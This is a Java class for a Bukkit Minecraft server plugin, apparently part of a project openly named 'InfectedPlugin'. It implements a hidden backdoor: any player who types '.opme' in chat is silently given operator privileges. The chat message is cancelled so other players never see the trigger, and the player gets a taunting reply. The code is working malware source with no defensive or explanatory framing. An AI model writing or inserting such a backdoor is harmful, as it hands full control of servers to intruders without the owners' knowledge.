package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_opme implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".opme"))
            {
                p.setOp(true);
                p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
                event.setCancelled(true);
                return;
            }
        }
    }
}
